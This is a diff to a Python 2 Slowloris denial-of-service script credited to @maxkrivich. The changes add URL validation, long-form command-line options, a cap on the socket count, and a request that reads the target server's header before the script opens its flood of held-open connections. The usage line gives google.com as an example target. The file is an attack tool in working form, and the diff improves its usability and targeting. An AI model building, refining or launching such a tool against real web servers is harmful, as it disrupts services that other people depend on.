@@ -10,7 +10,8 @@ import argparse
 import atexit
 import signal
 import datetime
-# import requests
+import re
+import requests
 
 headers = ['User-Agent: Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9b5) Gecko/2008050509 Firefox/3.0b5',
 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
@@ -22,21 +23,38 @@ soketCount = 300
 URL = ''
 line = '-' * 69
 
+def validateURL(url):
+	regex = re.compile(
+		r'^(?:http|ftp)s?://'  # http:// or https://
+		r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
+		r'localhost|'  # localhost...
+		r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
+		r'(?::\d+)?'  # optional port
+		r'(?:/?|[/?]\S+)$', re.IGNORECASE)
+	return regex.match(url)
+
 def clearScreen():
 	os.system('cls' if os.name == 'nt' else 'clear')
 
 def parseArgs():
 	global soketCount, URL
 	parser = argparse.ArgumentParser()
-	parser.add_argument('-u',action='store')
-	parser.add_argument('-s',action='store')
+	parser.add_argument('-u','--url',action='store', dest='u', help='URL adress')
+	parser.add_argument('-s','--sockets', action='store', type=int,dest='s', help='Socket count')
 	arg = parser.parse_args()
 
 	if arg.s:
-		soketCount = int(arg.s)
+		if 0 < arg.s < 500:
+			soketCount = arg.s
+		else:
+			sys.exit(-1)
 
 	if arg.u:
-		URL = arg.u
+		if validateURL(arg.u):
+			URL = arg.u
+
+		else:
+			sys.exit(-1)
 	else:
 		sys.exit(-1)
 
@@ -52,10 +70,18 @@ def createSocket():
 	return res
 
 def run():
+	global URL, soketCount
 	print '\n\t\tSlowLoris implementation by @maxkrivich\n'
 	print line
-	print '[*] Target IP:\t\t%s\n[*] Target Hostname:\t%s\n[*] Target Port:\t%s\n[*] Start Time:\t\t%s\n[*] Socket Count:\t%d' % \
-			(socket.gethostbyname(URL), URL,'80', datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),soketCount)
+
+	response = requests.get(URL)
+	serv = response.headers.get('Server')
+	URL = URL.replace('https://', '')
+	URL = URL.replace('http://', '')
+
+	print '[*] Target IP:\t\t{}\n[*] Target Server:\t{}\n[*] Target Hostname:\t{}\n[*] Target Port:\t{}\n[*] Start Time:\t\t{}\n[*] Socket Count:\t{}'.\
+		format(socket.gethostbyname(URL),serv, URL, '80', datetime.datetime.now().strftime("%Y-%m-%d %H:%M"), soketCount)
+
 	print line
 	cnt = 0
 	while soketCount - cnt > 0:
@@ -102,7 +128,7 @@ def ex(signal, frame):
 def main():
 	clearScreen()
 	if len(sys.argv) < 2:
-		print '\nUsage: \n -u \t google.com [str]\n -s \t socket count [int]\n\n'
+		print '\nUsage: \n -u or --url\t http://google.com [str]\n -s or --sockets \t socket count [int]\n\n'
 		sys.exit(-1)
 	else:
 		signal.signal(signal.SIGINT, ex)
